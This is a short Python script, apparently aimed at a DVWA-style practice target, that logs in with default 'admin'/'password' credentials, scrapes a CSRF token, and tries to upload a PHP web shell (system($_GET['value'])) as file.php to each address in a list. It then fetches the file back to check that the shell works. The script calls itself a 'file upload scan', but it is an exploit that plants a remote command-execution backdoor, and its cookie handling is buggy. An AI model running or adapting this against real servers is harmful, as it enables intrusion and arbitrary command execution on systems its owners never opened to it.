from bs4 import BeautifulSoup as bs
import requests

f = open('addresses.txt', 'r')
file_contents = f.readlines()

def getCookie():
    with requests.Session() as session:
        html = session.get('http://45.147.96.25:4242/login.php')
        html_parsed = bs(html.text, "html.parser")
        user_token = html_parsed.find('input', { "type" : "hidden" })['value']
        creds = {
            "username"   : 'admin',
            "password"   : 'password',
            "Login"      : "Submit",
            "user_token" : user_token
        }
        request = session.post('http://45.147.96.25:4242/login.php', data = creds)
        cookie = html.cookies.get_dict()
        session.close()
    return cookie

uploadableForm = []
report = "Starting automated file upload scan:\n"

print("Starting automated file upload scan:")

for count, line in enumerate(file_contents, start=1):
    address = line[13:].split(' ')[0].strip()
    print('Searching for form in ' + address + '... [' + str(count) + '/' + str(len(file_contents)) + ']')

    if address.endswith(".ini") or address.endswith(".txt") or "/." in address:
        report += address + " can't be the subject of file upload\n"
    else:
        cookie = getCookie()['PHPSESSID']
        request = requests.post(address,cookies=cookie,files={'MAX_FILE_SIZE': (None, '100000'),'uploaded':('file.php','<?php system($_GET[\'value\']);?>') ,'Upload': (None, 'Upload')})
        request2 = requests.get(address+"file.php",cookies=cookie)
        print(address,request.text,request2.text)
print(report)